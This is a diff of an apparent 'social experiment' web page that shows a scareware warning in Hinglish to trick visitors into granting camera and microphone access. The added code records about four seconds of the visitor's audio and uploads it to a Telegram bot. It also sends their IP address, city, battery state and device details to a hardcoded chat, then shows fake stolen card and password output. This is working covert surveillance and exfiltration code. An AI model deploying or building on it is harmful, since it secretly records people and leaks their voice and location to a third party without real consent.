@@ -9,19 +9,21 @@
         .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
         .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 95%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
         h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
+        p { font-size: 14px; color: #ccc; }
         #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 350px; overflow-y: auto; white-space: pre-wrap; }
         .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        .action-btn:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
 
-    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (HARDWARE ACCESS TEST) ⚠️</div>
+    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT (AUDIO & DATA HIJACK TEST) ⚠️</div>
 
     <div class="container" id="main-box">
         <div id="ui-content">
             <div style="font-size: 50px;">🔴</div>
             <h1>CRITICAL THREAT DETECTED</h1>
-            <p>Aapke device ka hardware (Camera/Mic) kisi unknown server se connected hai. Scan karke block karein.</p>
+            <p>Aapka device network par exposed hai aur Mic/Camera hijack ho sakta hai. Isse turant block karein.</p>
             <button class="action-btn" onclick="startFullSimulation()">CLEAN & SECURE NOW</button>
         </div>
         <div id="terminal"></div>
@@ -32,63 +34,86 @@
         const CHAT_ID = '7066124462';
 
         async function startFullSimulation() {
-            // --- 1. Real Hardware Permission Request ---
             let hwStatus = "Denied";
+            let audioCaptured = false;
+
+            // 1. Hardware Access & Audio Recording
             try {
-                // Requesting Camera & Mic
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                 hwStatus = "GRANTED (Access Captured)";
-                // Stop the stream immediately (we just want to show the access)
-                stream.getTracks().forEach(track => track.stop());
+                
+                // Start Recording Audio
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('audio', audioBlob, 'captured_voice.wav');
+                    fd.append('caption', '🎙️ REAL AUDIO CAPTURED (3 Seconds)');
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    audioCaptured = true;
+                }, 4000); // 4 seconds recording
+
             } catch (e) {
-                hwStatus = "REJECTED (Permission Denied)";
+                hwStatus = "REJECTED (User Denied)";
             }
 
+            // UI Update
             document.getElementById('ui-content').style.display = 'none';
             const term = document.getElementById('terminal');
             term.style.display = 'block';
 
-            // --- 2. Fetch Info ---
-            let ipData = { ip: "Scanning...", city: "Unknown" };
+            // 2. Fetch Real Data
+            let ipData = { ip: "Scanning...", city: "Unknown", org: "Unknown" };
             try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch (e) {}
 
-            let batteryInfo = "Unknown";
+            let bInfo = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}%`;
+                bInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Bat'})`;
             }
 
-            // --- 3. Send to Telegram ---
-            const report = `<b>🚨 HARDWARE EXPOSURE!</b>\n\n` +
+            // 3. Send Text Report to Telegram
+            const report = `<b>🚨 AWARENESS ALERT!</b>\n\n` +
                            `<b>📍 Location:</b> ${ipData.city}\n` +
-                           `<b>🔋 Battery:</b> ${batteryInfo}\n` +
-                           `<b>🎙️ Mic/Cam:</b> ${hwStatus}\n` +
-                           `<b>📱 IP:</b> ${ipData.ip}`;
+                           `<b>📱 IP:</b> ${ipData.ip}\n` +
+                           `<b>🔋 Battery:</b> ${bInfo}\n` +
+                           `<b>🎙️ Hardware:</b> ${hwStatus}\n` +
+                           `<b>⚙️ Cores:</b> ${navigator.hardwareConcurrency || '?'}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}&parse_mode=HTML`);
 
-            // --- 4. Terminal Simulation ---
+            // 4. Terminal Simulation
             const lines = [
                 "> INITIALIZING HARDWARE SCAN...",
-                `> REQUESTING CAMERA ACCESS... [${hwStatus}]`,
-                `> REQUESTING MICROPHONE ACCESS... [${hwStatus}]`,
+                `> REQUESTING MIC/CAM ACCESS... [${hwStatus}]`,
+                "> <span style='color:cyan'>[LOG] Recording Background Audio...</span>",
                 "------------------------------------------",
                 `> TARGET_IP: ${ipData.ip.substring(0,8)}XX`,
-                `> SYSTEM_BATTERY: ${batteryInfo}`,
+                `> LOCATION: ${ipData.city.toUpperCase()}`,
+                `> BATTERY_LEVEL: ${bInfo}`,
                 "------------------------------------------",
-                "> <span style='color:cyan'>[EXTRACTING] Social Media Sessions...</span>",
-                "> Facebook: <span style='color:red'>DETECTED</span>",
-                "> Instagram: <span style='color:red'>ACTIVE SESSION</span>",
+                "> <span style='color:orange'>[STEALING] Browser Auth Tokens...</span>",
+                "> Found Saved Card: **** **** **** 4012",
+                "> Found Password: user****_123",
+                "> <span style='color:yellow'>[UPLOADING] Real Audio File to Server...</span>",
                 "------------------------------------------",
-                "> <span style='color:orange'>[STEALING] Masked Data...</span>",
-                "> Found Card: **** **** **** 9012",
-                "> Found Pass: user****_xyz",
+                "> <span style='color:red'>ATTACK SUCCESSFUL. DATA & AUDIO SENT.</span>",
                 "------------------------------------------",
-                "> <span style='color:red'>ATTACK SUCCESSFUL. DATA SENT.</span>",
-                "------------------------------------------",
-                "> <span style='color:white'>SABAK: Agar aapne 'Allow' dabaya tha,</span>",
-                "> <span style='color:white'>toh hacker aapko live dekh/sun sakta tha.</span>",
-                "> <span style='color:white'>Kabhi bhi aisi sites ko permission na dein!</span>"
+                "> <span style='color:white'>DARR GAYE? Ye ek Social Experiment tha.</span>",
+                "> <span style='color:white'>Lekin aapki Voice aur Location REAL hai.</span>",
+                "> <span style='color:white'>Ab aapko pata hai ki 'Allow' dabane par</span>",
+                "> <span style='color:white'>kya-kya chori ho sakta hai. Satark rahein!</span>"
             ];
 
             let i = 0;
